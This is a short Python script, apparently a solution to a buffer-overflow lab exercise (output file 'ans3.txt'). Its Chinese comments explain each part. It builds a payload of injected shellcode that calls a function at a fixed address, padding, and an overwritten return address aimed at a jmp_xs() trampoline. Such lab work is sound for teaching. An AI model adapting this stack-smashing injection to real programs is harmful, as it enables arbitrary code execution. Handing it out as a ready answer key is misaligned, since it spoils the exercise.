# 汇编代码部分,机器码: mov rdi, 0x72; mov rax, 0x401216; call rax
shellcode = b"\xbf\x72\x00\x00\x00\x48\xc7\xc0\x16\x12\x40\x00\xff\xd0"

# 填充 26 字节 (40 - 14 = 26)
padding_fill = b"A" * 26

# jmp_xs()入口地址
jump_trampoline = b"\x34\x13\x40\x00\x00\x00\x00\x00" 

payload = shellcode + padding_fill + jump_trampoline

# 写入文件
with open("ans3.txt", "wb") as f:
    f.write(payload)

print("Payload written to ans3.txt")

